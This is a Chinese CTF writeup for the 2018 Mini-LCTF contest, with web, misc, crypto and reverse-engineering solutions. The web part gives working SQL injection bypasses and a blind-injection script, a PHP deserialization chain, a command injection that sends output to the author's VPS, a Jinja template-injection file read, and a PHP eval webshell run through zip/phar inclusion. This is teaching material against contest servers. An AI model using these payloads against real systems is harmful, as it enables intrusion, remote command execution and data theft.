---
layout: post
title: MiniLCFT 2018 Writeup
author: Qiqi
date: 2018-5-19
header-img: img/3bCLqdZMyCA.jpg
catalog: true
tag:
   - CTF
   - Writeup
---

# Mini-LCTF 2018 Writeup

为期一周的MakerCTF校内赛终于在今天圆满结束了，全靠飞哥和V神两位pwn爷爷带我一个web狗上分，拿了本次比赛的第一，庆祝一下（我就是混分的）

在这里我也整理了一下，比赛期间我做过的一些题目的wp

## Web

### baby sqli

```php
小明写的博客总是被人日，于是他一气之下写了一套超级牛逼的WAF，大黑阔们还能绕过吗?
hint:用户名为admin
hint1:
waf代码
if(preg_match("/*|#|;|,|is|file|drop|union|select|ascii|mid|from|(|)|or|\^|=|<|>|like|regexp|for|and|limit|file|--|||&|".urldecode('%09')."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i",$username)){
die('wafed by pupiles');
}
$password的过滤同$username
数据库连接代码
mysql_query("SELECT * FROM pupiles_admin where username = '".$username."' and passwd = '".md5($passwd)."'");
hint2:
先想想怎么绕过注释符
```

能过滤的基本都过滤了，哭～

想起来之前klaus跟我说过在某些特定情况下可以使用`反引号作注释

前提就是在可以使用别名的情况下，例如`order by` `group by`

使用反引号时，虽然我们只输入了一个，但是mysql会自动帮我们加上后面的那个，这样我们就可以把反引号后面所有东西都当作是一个别名，从而起到注释作用

这里我们可以使用`group by`语句来构造

因为能过滤的基本都被过滤了，不太可能又查询语句了，利用万能密码绕过

payload

```php
username=admin' group by @`
```

![](https://ws1.sinaimg.cn/large/006Vib6xly1frec08cfrbj30b20683yx.jpg)

### easy bypass

当我们给`hash_hmac`第二个参数传递的值为数组的时候，会返回`false`

这时`secret`的值我们就可以控制为`false`

本地输出一下

```
php > echo hash_hmac('sha256', 1, false);
41e0a9448f91edba4b05c6c2fc0edb1d6418aa292b5b2942637bec43a29b9523
```

Payload

```
hmac=41e0a9448f91edba4b05c6c2fc0edb1d6418aa292b5b2942637bec43a29b9523&host=1&nonce[]=1
```

即可绕过验证，获得flag`MiniLCTF{3asy_hm4c_Byp4ss_for_U}`

![](https://ws1.sinaimg.cn/large/006Vib6xly1frebentdshj30kr0di0v1.jpg)

### easy_unserialize

```
蛋黄是一只懒惰的肥猫。有一天他想瞄一眼flag，但是flag被层层的php魔法拦住了。你能帮他嘛？
```

需要了解一下php的类

利用实例化类时会自动执行`__construct()`函数来给变量赋值，以达到我们想要的结果

在`gg`类中，`$this->gg `调用了`start`类中的`get1()`方法

利用

```php
public function __construct()
{
  $this->gg = new start();
}
```

只要我们实例化一个`gg`类就可以让`$this->gg`变成`start`的一个实例，从而达到调用`get1()`方法的目的

往下看，在`cat`类中，我们看到一个`__invoke()`魔法函数，里面是一个`echo`，想到如果`echo`一个类的话，就会去调用`__toString()`魔法函数，而后面的`test`类中确实有一个`__toString()`，而且还调用了`getFlag()` 方法，正式我们想要达到的目的

返回来看`__invoke()`，当脚本尝试将对象调用为函数时，调用`__invoke()`方法

仔细找一下，有没有可能将类当作函数来调用的地方

在`start`类中，我们看到

```Php
public function get1()
{
    $s1 = $this->start1;
    $s2 = $this->start2;
    $s1($s2);
}
```

我们只要让`$this->start1 = new cat()`同时 `$htis->start2 = new test2()`即可，因为我们之前已经实例化了一个`start`类，所以用跟前面同样的方法我们就可以达到目的

这样`$s1($s2)`就会变成一个`cat`类被当成一个函数并将一个`test2`类当作参数传入，从而达到调用`__invoke()`函数的目的，然后接着去调用`__toString()`

再看`__toString()`，里面`$this->a`调用了`flag`类中的`gatFlag()`方法，还是之前的思路，将`$this->a`实例化为`flag`的一个类

得到最终的poc

```php
<?php
class gg
{
    private $gg;
    public function __construct()
    {
        $this->gg = new start();
    }
}
class start
{
    private $start1;
    private $start2;
    public function __construct()
    {
        $this->start1 = new cat();
        $this->start2 = new test2();
    }
}

class cat{}

class test2
{
    private $a;
    public function __construct()
    {
        $this->a = new flag();
    }
}

class flag{}

$test = new gg();
echo urlencode(serialize($test));
?>
```

运行一下得到payload

```
O%3A2%3A%22gg%22%3A1%3A%7Bs%3A6%3A%22%00gg%00gg%22%3BO%3A5%3A%22start%22%3A2%3A%7Bs%3A13%3A%22%00start%00start1%22%3BO%3A3%3A%22cat%22%3A0%3A%7B%7Ds%3A13%3A%22%00start%00start2%22%3BO%3A5%3A%22test2%22%3A1%3A%7Bs%3A8%3A%22%00test2%00a%22%3BO%3A4%3A%22flag%22%3A0%3A%7B%7D%7D%7D%7D
```

传入得到`MiniLCTF{eaSy_pHp_Uns3r1zal1z3_}`

![](https://ws1.sinaimg.cn/large/006Vib6xly1frebdt2n18j30az0520t9.jpg)

### CURL

```
没过滤全
```

命令注入

payload

```
curl=vpsip:port/`ls|base64`
```

我们也可以加上`head`和`tail`参数来限制返回的行数

例如

```
ls|base64|head -n 2|tail -n 1
```

在服务器上监听

```
Listening on [0.0.0.0] (family 0, port 2333)
Connection from 45.40.207.251 53920 received!
GET /LS02eGFramRoY2ZoY25zawotLTd4YWJmOHNhaGRjaGZ1ZHkudHh0CmNzcwppbmRleC5waHAK HTTP/1.1
User-Agent: curl/7.38.0
```

用base64解码一下`LS02eGFramRoY2ZoY25zawotLTd4YWJmOHNhaGRjaGZ1ZHkudHh0CmNzcwppbm`

得到

```
--6xakjdhcfhcnsk
--7xabf8sahdchfudy.txt
css
index.php
```

直接访问`—7xabf8sahdchfudy.txt`得到flag`MiniLCTF{Y0u_G3t_1t_2333}`

![](https://ws1.sinaimg.cn/large/006Vib6xly1frebcxoeh2j30c905w0t8.jpg)

### 幸运数字

这题比赛的时候没做出来，出题人说可能我们没见过的（事实确实如此），但是因为有队伍拿了一血，所以不能放提示

这题其实是模版注入，后端是用python写的

有了这个条件，这题就很简单了

比赛的时候就发现在输入昵称的框里输入一些可以弹框的xss的时候，可以在查看结果的页面弹框，但是这攻击的是客户端，又没有bot，那应该不是xss了

知道了是模版注入，根据之前能够xss，说明渲染的模版内容受到我们的控制，所以我们要使用模版注入，插入在服务器端执行的代码

先试个

```
{{2*10}}
```

![](https://ws1.sinaimg.cn/large/006Vib6xly1frghc3ixjij30e50aut9f.jpg)

![](https://ws1.sinaimg.cn/large/006Vib6xly1frghc92j1hj30dz0453yw.jpg)

成功执行，说明确实是模版注入没错

再尝试输入

```
{{config}}
```

得到

![](https://ws1.sinaimg.cn/large/006Vib6xly1frghdi1bxej313x0a479b.jpg)

不仅执行了，还看到了hint，激动～

看着这个hint很久，猜想会不会是一个路径，于是我们去访问这个路径

果然，不出所料`Oh you found me. Good job! Next, you need to read the flag in ./flag/flag.txt`

尝试直接去访问这个路径并不行

所以我么还是要利用模版注入去执行命令

我们先调用一下这些对象的内置方法，去看一下当前环境能访问哪些对象

`''.__class__`可以访问到字符串的类型对象

因为python中所有对象都是从object逐级继承来的，类型对象也不除外，所以我们就可以调用对象的`__base__`犯方法访问该对象继承的对象，或者使用`__mro__`直接获得对象的继承链，python用这个方法来确定对象方法的顺序

当我们访问到object的类型对象的时候，就可以用`__subclasses__()`来获得当前环境下能够访问的所有对象

```
{{''.__class__.__mro__[2].__subclasses__()}}
```

或者

```
{{(1).__class__.__base__.__subclasses__()}}
```

![](https://ws1.sinaimg.cn/large/006Vib6xly1frghwxbelhj31400l4gvd.jpg)

看到`file`，又有刚才获得的路径，我们可以读取文件了

```
{{''.__class__.__mro__[2].__subclasses__()[40]('./flag/flag.txt','r').read()}}
```

得到flag`MiniLCTF{e215h-c0adj-14sjs-mn74h}`

![](https://ws1.sinaimg.cn/large/006Vib6xly1frghz6fcldj30la02xmxo.jpg)

### baby sqli2

```
小明刚写的WAF就被打脸，于是不服气的小明升级了新的waf，大黑客们还能绕过吗
```

发现注释符，逻辑连接词都被过滤了

猜测后台判断语句为`$username == 'admin'`，如果是这样的话，我们就利用弱类型来绕过

比如`0 == 'admin'`就会返回1，绕过验证，而`1 == 'admin'`返回空

发现`^`异或符没有被过滤

这样就有办法了，我们可以通过异或来构造这个`0`

测试一下

```
php > echo 'admin'^1^1;
0
php > echo 'admin'^1;
1
```

但是我们还要闭合后面的`'`

```
php > echo 'admin'^1^'1';
0
php > echo 'admin'^0^'1';
1
```

成功

利用`sql1`给的查询语句知道字段名是`passwd`

payload

```php
username=admin'^(ascii(mid((passwd)from(1)))>=32)^'1&passwd=123
```

当`ascii(mid((passwd)from(1)))>=10`为真时，返回1，所以username的值就是0，返回`passwd is wrong`，当`ascii(mid((passwd)from(1)))>=10`为假时，返回0，username的值这是就是1，返回`wafed by pupiles`

利用这点我们就可以盲注了

脚本如下

```python
import requests
url = 'http://45.40.207.251:8002/login.php'
s = requests.Session()
passwd = ''
for l in range(1,33):
    for c in range(32,133):
        username = "admin'^(ascii(mid((passwd)from(%d)))>=%d)^'1'='1" % (l,c)
        data = {'username':username, 'passwd':123}
        html = s.post(url,data=data).text
        if 'admin' in html:
            passwd += chr(c - 1)
            print passwd
            break
```

运行一下

![](https://ws1.sinaimg.cn/large/006Vib6xly1freb9pm8uzj30e20hfanv.jpg)

获得`passwd`的md5值

在线解密一下得到`passwd`为`admin233`

登录一下

![](https://ws1.sinaimg.cn/large/006Vib6xly1frebbp3mq1j30c407l74q.jpg)

### 神秘的交流平台

```
西电有一群安全圈远近闻名的黑客，他们经常需要讨论一些0day相关的事情，为了防止信息泄露，于是其中的一个大牛手写了一个只有他们自己会使用的交流平台，这个平台从未对外公开，但是他们发现在这个平台交流的信息被外人知道了，他们猜测有漏洞的存在，同学你能帮帮忙吗？
hint1: 控制台基本操作了解一下？
```

页面是个交流平台，有个登录框，需要输入`code name`和`invitation code`，页面右下角还有一个`visit number`

扫个目录还发现了一个`test.php`，访问返回`Your IP address is not allowed.`

随便试了一些ip都不行，就先把它搁一边了

打开开发者工具，看到有个`invitation_code.js`，发现是个函数
放到控制台

![](https://ws1.sinaimg.cn/large/006Vib6xly1frecj7dgbaj313n09dafq.jpg)

首先给函数弄个名字`f`定义一下

再定义一个变量`p`调用这个`f`函数，凭借首返回值`p`

输入`p`回车，看到返回结果

格式化字符串一下

```javascript
window.v_ariational = function() {
	$.ajax({
		type: "POST",
		dataType: "json",
		url: "/CTF1.php",
		success: function(a) {
			console.log(a)
		},
		error: function(a) {
			console.log(a)
		}
	})
};
window.va_riational = function() {
	$.ajax({
		type: "POST",
		dataType: "json",
		url: "/CTF2.php",
		success: function(a) {
			console.log(a)
		},
		error: function(a) {
			console.log(a)
		}
	})
};
window.get_invitation_code = function() {
	$.ajax({
		type: "POST",
		dataType: "json",
		url: "/CTF.php",
		success: function(a) {
			console.log(a)
		},
		error: function(a) {
			console.log(a)
		}
	})
};
window.var_iational = function() {
	$.ajax({
		type: "POST",
		dataType: "json",
		url: "/CTF3.php",
		success: function(a) {
			console.log(a)
		},
		error: function(a) {
			console.log(a)
		}
	})
};
window.vari_ational = function() {
	$.ajax({
		type: "POST",
		dataType: "json",
		url: "/CTF4.php",
		success: function(a) {
			console.log(a)
		},
		error: function(a) {
			console.log(a)
		}
	})
};
window.varia_tional = function() {
	$.ajax({
		type: "POST",
		dataType: "json",
		url: "/CTF5.php",
		success: function(a) {
			console.log(a)
		},
		error: function(a) {
			console.log(a)
		}
	})
};
window.variat_ional = function() {
	$.ajax({
		type: "POST",
		dataType: "json",
		url: "/CTF6.php",
		success: function(a) {
			console.log(a)
		},
		error: function(a) {
			console.log(a)
		}
	})
};
window.variati_onal = function() {
	$.ajax({
		type: "POST",
		dataType: "json",
		url: "/CTF7.php",
		success: function(a) {
			console.log(a)
		},
		error: function(a) {
			console.log(a)
		}
	})
};
window.variatio_nal = function() {
	$.ajax({
		type: "POST",
		dataType: "json",
		url: "/CTF8.php",
		success: function(a) {
			console.log(a)
		},
		error: function(a) {
			console.log(a)
		}
	})
};
window.variation_al = function() {
	$.ajax({
		type: "POST",
		dataType: "json",
		url: "/CTF9.php",
		success: function(a) {
			console.log(a)
		},
		error: function(a) {
			console.log(a)
		}
	})
};
window.variationa_l = function() {
	$.ajax({
		type: "POST",
		dataType: "json",
		url: "/CTF10.php",
		success: function(a) {
			console.log(a)
		},
		error: function(a) {
			console.log(a)
		}
	})
};
```

发现`CTF1-10.php`都不存在，只有`CTF.php`是存在的而且状态码为405被服务器禁止访问了，并且调用了`get_invitation_code()`函数

去控制台里执行一下这个函数，返回

```
data
:
{content: "Vs lbh jnag shegure vasbezngvba, cyrnfr hfr CBFG gb npprff/4qs810ss9q0pno8r342469sr3n9nn885.cuc.", enctype: "ROT13"}
```

解rot13得到`If you want further information, please use POST to access/4df810ff9d0cab8e342469fe3a9aa885.php`

于是请求`/4df810ff9d0cab8e342469fe3a9aa885.php`并抓包修改`GET`为`POST`

得到一串base64编码的字符串`SlhOVi1ZREFVLVNHUk8tRUlSUC1DQUJL`，解码得到`JXNV-YDAU-SGRO-EIRP-CABK`，这应该就是邀请码了

用给的`visit number`和我们获得的邀请码登录一下得到

![](https://ws1.sinaimg.cn/large/006Vib6xly1fred5ga1g8j309502nwet.jpg)

获得了ip以及一个可以文件上传的页面

因为这里每次放需要带上ip，每次都添加非常麻烦，火狐有个很好用的插件`Modify Header`，可以让他一直都带着这个ip

这时去访问`test.php`，返回`管理员测试页： rf=include($input.".php");`

显然是个文件包含了

那么这题思路非常清晰了，上传一个php一句话，然后包含这个带有一句话的文件，之后命令执行getshell

但是这个文件上传只能上传txt为后缀的文件，并且他会给你的文件重新命名，也是txt为后缀，同时读取文件的时候，会给你加上php后缀

如果我们只是单纯的传一个txt上去，例如`DPI0mMOQm4BBBGUB.txt`，读取的时候就会变成`DPI0mMOQm4BBBGUB.php`，显然这个文件是不存在的，我们要绕过这一点

当我们上传成功一个文件的时候，他还会返回

```
DPI0mMOQm4BBBGUB.txt and you can read it by visiting /1bda80f2be4d3658e0baa43fbe7ae8c1.php
```

`/1bda80f2be4d3658e0baa43fbe7ae8c1.php`，这是一个读取我们上传的文件的页面，看似没什么用，其实非常重要，待会我会说这个 页面重要在哪

至此，我们来理一下思路

`/test.php`是一个文件包含的页面，但是只能包含后缀为`php`的文件

`/46c48bec0d282018b9d167eef7711b2c.php `是一个文件上传的页面，但是只能上传文件名后缀为`txt`文件

`/1bda80f2be4d3658e0baa43fbe7ae8c1.php`是一个读取上传文件的页面，只能读取后缀是`txt`的文件

首先我们要写个php一句话，文件名就叫做`test.php`

```php
<?php
@eval($_POST[a]);
?>
```

上传后抓个包，把后缀改为`txt`即可以绕过验证成功上传

一开始以为要让我去绕过`/test.php`页面中`include($input.".php")`自动拼接`.php`

然后发现了三种方法

第一种是`%00`截断，`magic_quotes_gpc = off && php< 5.3.4`

第二种是文件名过长导致截断，`php version < 5.3.4`

第三种是转换字符集造成的截断，但是需要有`iconv`()函数

以上三种方法都不适用于本题

于是想到之前找资料的时候看到的，`zip://`和`phar://`伪协议，貌似也可以绕过本题的情况

测试一下，将我们刚刚写的那个`test.php`压缩成一个压缩包`test.zip`

上传抓包，修改后缀为txt，成功上传

然后就要使用`zip://`和`phar://`伪协议了

`zip://`使用方法`zip://file1%23file2`

`phar://`使用方法`phar://file1/file2`

这里`file1`是我们上传的那个压缩文件名，`file2`是我们解压后的文件名，他们两唯一不一样的地方就是两个文件的分隔符，注意一下就好

因为解压出来的文件名是`tets.php`后缀为`php`，所以可以成功解决后缀必须是`php`的问题了

然后很兴奋的去试了一番，发现并不行，怀疑人生了～

现在重要的读取文件的页面要上场了

路径！路径！路径！

随便读取一个文件，注意看路径是在`/Uploads/`下

我一开始是的时候，并没有加上路径，所以怎么试都出不来

所以最终payload是

```
rf=zip://Uploads/qLJKh484uso4dgNo.txt%23test
或者
rf=phar://Uploads/qLJKh484uso4dgNo.txt/test
```

post`a=system('ls');`，返回

```
1bda80f2be4d3658e0baa43fbe7ae8c1.php
46c48bec0d282018b9d167eef7711b2c.php
4df810ff9d0cab8e342469fe3a9aa885.php
CTF.php
Montserrat-Regular.ttf
Uploads check_inv_code.php
f_____l_____a_____g.txt
index.php
js
test.php 
```

看到`f_____l_____a_____g.txt`，兴奋～

post`a=system('cat f_____l_____a_____g.txt');`，得到`flag{810c4b69640d5545f610ea1f35fbd880}`

![](https://ws1.sinaimg.cn/large/006Vib6xly1fref16oo0mj30hq05u74w.jpg)

## Misc

### Welcome

签到，直接提交flag

### Nazo

#### Lv0 谜.io

直接`GO`

#### Lv1 欢迎

```
nazo.io 是一款解谜游戏

在下方输入正确的 key答案，即可进入下一关

key: welcome
```

直接给出了key`welcome`

#### Lv2 规则

```
每关 key 由小写字母、数字组成，不含空格

key 在哪儿呢 ^_^
```

右键查看源代码，得到key是`gotcha`

#### Lv3 从右往左念

```
where is key

标题有时很重要
```

提示从右往左念`key is where`

所以key是`where`

#### Lv4 完形填空

```
Life is a chain of moments of enjoyment, not only about ________.

搜索引擎是你的好朋友
```

直接google到答案是`survival`

#### Lv5 Morse

```
··· --- ···
```

摩斯密码

解码得到`SOS`

#### Lv6 Base64

```
恭喜！你完成了新手教学关卡！（邪恶笑）

好戏现在正式开演 ^_^

MTAyOTE3NDAzNw==
```

base64解码得到`1029174037`

#### Lv7 OICQ

```
这关答案请直接找帅气的游戏作者！不要问我怎么找作者 ¬_¬

你刚输入了什么？
```

搜索一下`OICQ`是啥，发现是QQ，联系提示，想到上一题的key是作者qq号，搜一下，在加好友问题中发现key是`Macintosh`

#### Lv8 IDNs

```
错的是.世界
```

搜一下`IDNs`，发现是国际化域名

直接访问`https://错的是.世界`得到key是`Saionjisekai`

#### Lv9 角度

![](https://nazo.io/image/verifycode.png)

```
请输入图中的验证码，帮助我们确认您不是机器人
```

我们从正向和左侧都能看到英文单词是`pineapple`

#### Lv10 回到上世纪

![](https://nazo.io/image/lastcentury.jpg)

```
What's this?
```

百度识图，显示是鼠标，所以key是`mouse`

#### Lv11 Unicode

```
𝖓𝖊𝖜𝓮𝓻𝕠𝕤𝒍𝒆𝙨𝙨𝓽𝓸𝓯𝓾

「据说只有 XXX 块以上的设备才能看见上面的文字」
```

上面那串文字就是key：`neweroslesstofu`

#### Lv12 1A2B

```
1234 0A0B

5678 0A2B

9576 3A0B

____ 4A0B
```

猜数游戏

前四个是数字，后四个中的第一个数字表示数字也对位置也对的个数，第三个数字表示数字对但位置不对的个数

所以锁定是`95_6`，猜一个`9506`，对了

#### Lv13 虚无

乍一看什么都没有，拖动鼠标，发现有一张图片的轮廓被选中

![](https://nazo.io/image/void.png)

因为和背景颜色一样所以，看不到，新窗口打开就能看到是`thealpha`

#### Lv14 我爱记歌词

```
♪ 我种下 __ __ __ __

♪ 终于 __ __ __ __ __

♪ 今天是个 __ __ __ __
```

![](https://nazo.io/image/apple.jpg)

查看源代码看到`<img src="[image/apple.jpg](https://nazo.io/image/apple.jpg)" alt="我真的不只是配图" title="我真的不只是配图" style="width:120px; max-width: 100%"></img>`

猜测是图片隐写

binwalk发现zip，foremost分离一下

分离得到的zip解压得到一个种子文件，工具打开，看到一个文件叫`greendam.key`，猜测key就是`greendam`，通过

#### Lv15 声音的轨迹

分析一下音轨，用工具查看频谱图

![](https://ws1.sinaimg.cn/large/006Vib6xly1fre9vlg0fmj30m3088qbu.jpg)

应该是个镜像翻转，反过来是`koenokisekl`

但是怎么提交都不对，后来又想了各种方法，都不行，但是很明确的一点是这确实是key

于是猜测最后一个`l`会不会是`i`，只是显示不出来

提交`koenokiseki`正确

好坑啊。。。为什么软件在mac上总是出现这种显示不全的问题，怎么拉伸都不行～

#### Lv16 虚掩

又是给了一张背景色和大背景一样的图，乍一看什么都没有，拖动看到一张图，新标签页打开

打开检查元素

![](https://ws1.sinaimg.cn/large/006Vib6xly1frea397tchj30fi061764.jpg)

将这里所有的`width`和`height`改为0

得到`secretvg`

![](https://ws1.sinaimg.cn/large/006Vib6xly1frea459h5pj30hd0bct8z.jpg)

#### Lv17 虚空

随意拖动，发现五行空格

复制下来unicode编码

得到

```
\u2003\u2003\u2003\u2003\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2003\u2003\u2003\u2003\u2003\u2002\u2002\u2003\u2003\u2003\u2003\u2003\u2002\u2002\u2003\u2003\u2003\u2003\u2003\u2002\u2002\u2003\u2003\u2003\u2003\u2003\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003

\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2003\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2003\u2002\u2002

\u2003\u2003\u2003\u2003\u2002\u2002\u2003\u2002\u2002\u2003\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2003\u2003\u2003\u2003\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2003\u2003\u2003\u2003\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002

\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2003\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002

\u2003\u2003\u2003\u2003\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2003\u2003\u2003\u2003\u2003\u2002\u2002\u2003\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2003\u2002\u2002\u2002\u2002
```

搜索一下资料，发现`\u2003`与em同宽，`\u2002`与en同宽，且是em的一半

有思路了，应该是要把`\u2003`换成一种字符，`\u2002`换成另一种字符，并且`\u2003`的宽度得是`\u2002`的两倍

于是我们将`\u2003`换成`1 1 `，将`\u2002`换成两个空格，得到

![](https://ws1.sinaimg.cn/large/006Vib6xly1freaezl2rlj310805n0y7.jpg)

key是`ENTROPY`，也即为本题flag

### see or do not see

pdf转word

然后将图片缩小，看到flag

![](https://ws1.sinaimg.cn/large/006Vib6xly1frem6chzv3j30ef0a8n16.jpg)

### Moe

先binwalk跑一下，没看出来什么东西

pngcheck一下，发现有两个文件结尾，猜测是有两个png但是第二个缺少文件头

分离出第二张图片，加上文件头得到和原来的图片看起来一样的另一张图片

写个脚本对比了一下两张图片的数据，发现不一样的数据量太大，应该和bit没什么关系了

于是想到了盲水印，github上有现成的工具

运行一下得到`MiniLCTF{This_iS_BlindWaterMark_hahaha}`

![](https://ws1.sinaimg.cn/large/006Vib6xly1fremonflb5j318g0xcnpd.jpg)

### Moe's revenge

`binwalk` `pngcheck`都没发现什么东西

放进`stegsolve`里面看一下，发现RGB的0位有问题

`data extract`选中RGB的0位，得到一串字符`9keKZ9LDcKHV@@)-=UD)AN2PSBiAA[0OJ=.DeslN`

比赛的时候做到这就卡住了，没想到base85

base85解码得到`MiniLCTF{LSB&base85_iS_s0_cool~}`

## Crypto

### Easy RSA

`RSA基础`

先使用openssl解析公钥文件得到模数和公钥

```
qiqi@qiqi-Mac ~/Desktop> openssl rsa -pubin -text -modulus -in publickey.pem
Modulus (256 bit):
    00:bf:e9:96:75:20:88:88:5f:2e:a2:35:2f:df:3e:
    95:15:f6:62:fc:4d:34:75:dd:a6:f8:a1:60:8e:54:
    b4:16:b7
Exponent: 65537 (0x10001)
Modulus=BFE996752088885F2EA2352FDF3E9515F662FC4D3475DDA6F8A1608E54B416B7
writing RSA key
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAL/plnUgiIhfLqI1L98+lRX2YvxNNHXd
pvihYI5UtBa3AgMBAAE=
-----END PUBLIC KEY-----
```

公钥：`65537 (0x10001)`

模数：`BFE996752088885F2EA2352FDF3E9515F662FC4D3475DDA6F8A1608E54B416B7`

转换为十进制：`86804467865189181998675682302645596768517985924006311724377177674474176386743`

使用在线分解网站：`http://factordb.com`

p = `293086410338424676391341741631987307899`

q = `296173636181072725338746212384476813557`

然后写个python脚本解密：

```
import gmpy2

p = 293086410338424676391341741631987307899
q = 296173636181072725338746212384476813557
e = 65537

f = int(open('flag.enc', 'rb').read().encode('hex'), 16)
print f
n = p * q
fn = (p - 1) * (q - 1)
d = gmpy2.invert(e, fn)
h = hex(gmpy2.powmod(f, d, n))[2:]
if len(h) % 2 == 1:
    h = '0' + h
s = h.decode('hex')
print s
```

运行一下得到`minil{rsa_1s_c00l}`

### Crypto2

今年国赛原题，就改了两个数字

题目：

```java
import java.math.BigInteger;
import java.util.Random;

public class Test4 {
    static BigInteger two =new BigInteger("2");
    static BigInteger p = new BigInteger("11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711");
    static BigInteger h= new BigInteger("7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916");

    /*
     Alice write the below algorithm for encryption.
     The public key {p, h} is broadcasted to everyone.
    @param val: The plaintext to encrypt.
        We suppose val only contains lowercase letter {a-z} and numeric charactors, and is at most 256 charactors in length.
    */
      
    public static String pkEnc(String val){
        BigInteger[] ret = new BigInteger[2];
        BigInteger bVal=new BigInteger(val.toLowerCase(),36);
        BigInteger r =new BigInteger(new Random().nextInt(10000000)+"");
        ret[0]=two.modPow(r,p);
        ret[1]=h.modPow(r,p).multiply(bVal);
        return ret[0].toString(36)+"=="+ret[1].toString(36);
    }

    // Alice write the below algorithm for decryption. x is her private key, which she will never let you know.
    public static String skDec(String val,BigInteger x){
        if(!val.contains("==")){
            return null;
        }
        else {
            BigInteger val0=new BigInteger(val.split("==")[0],36);
            BigInteger val1=new BigInteger(val.split("==")[1],36);
            BigInteger s=val0.modPow(x,p).modInverse(p);
            return val1.multiply(s).mod(p).toString(36);
        }
    }
   

    public static void main(String[] args) throws Exception {
        System.out.println("You intercepted the following message, which is sent from Bob to Alice:");
        String str1 = "The message you input"
        String str2 = pkEnc(str1);
        String str3 = "j6jj3x3ekpckviaud7iqcer09lo7y9tzipt6ybedojtypte6esoy8n8qbbkhx4m47i19ergp44djdwfds3q3wz657q62jria3di==71rf2w5m1b6uh408iqwte64ek1jbjnhdam9g6xn6l5zj7e8fh7sbv7bsmpdv4b31292yiojao025hltmvm2ke5y89gy3r858c12cabzai8fw98aiatg1c";
        String str4 = skDec(str3,x);
        System.out.println("Please figure out the plaintext!");
    }
}
//j6jj3x3ekpckviaud7iqcer09lo7y9tzipt6ybedojtypte6esoy8n8qbbkhx4m47i19ergp44djdwfds3q3wz657q62jria3di==71rf2w5m1b6uh408iqwte64ek1jbjnhdam9g6xn6l5zj7e8fh7sbv7bsmpdv4b31292yiojao025hltmvm2ke5y89gy3r858c12cabzai8fw98aiatg1c
```

关键代码如下：

```java
public static String pkEnc(String val){
        BigInteger[] ret = new BigInteger[2];
        BigInteger bVal=new BigInteger(val.toLowerCase(),36);
        BigInteger r =new BigInteger(new Random().nextInt(10000000)+"");
        ret[0]=two.modPow(r,p);
        ret[1]=h.modPow(r,p).multiply(bVal);
        return ret[0].toString(36)+"=="+ret[1].toString(36);
    }
```

因为我们已经有了加密后的文本，所以我们很容易就能爆破出r值

```python
ret = int('j6jj3x3ekpckviaud7iqcer09lo7y9tzipt6ybedojtypte6esoy8n8qbbkhx4m47i19ergp44djdwfds3q3wz657q62jria3di', 36)
p = 11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711
for r in range(1000000, 10000000):
  print r
  if ret == pow(2, r, p):
    print "r is %s" % r
    break
```

得到`r = 8485716`

```Python
def base36encode(number, alphabet='0123456789abcdefghijklmnopqrstuvwxyz'):
    """Converts an integer to a base36 string."""
    if not isinstance(number, (int, long)):
        raise TypeError('number must be an integer')
	base36 = ''
    sign = ''
	if number < 0:
        sign = '-'
        number = -number
	if 0 <= number < len(alphabet):
        return sign + alphabet[number]
	while number != 0:
        number, i = divmod(number, len(alphabet))
        base36 = alphabet[i] + base36
	return sign + base36


c1 = int('j6jj3x3ekpckviaud7iqcer09lo7y9tzipt6ybedojtypte6esoy8n8qbbkhx4m47i19ergp44djdwfds3q3wz657q62jria3di', 36)
c2 = int('71rf2w5m1b6uh408iqwte64ek1jbjnhdam9g6xn6l5zj7e8fh7sbv7bsmpdv4b31292yiojao025hltmvm2ke5y89gy3r858c12cabzai8fw98aiatg1c', 36)
p = 11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711
h = 7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916
r = 8485716

print(base36encode(c2 / pow(h, r, p)))
```

运行得到`minilctfthisisflag`

## RE

### 贪吃蛇

游戏打开，非常难玩，四周有墙，中间还有`XDSEC`的地图墙

用16进制编辑器打开，看到里面一堆1，将1改成0，成功把墙去掉

玩到30分出flag`MiniLCTF{1et_us_van_a_g4me!!!}`

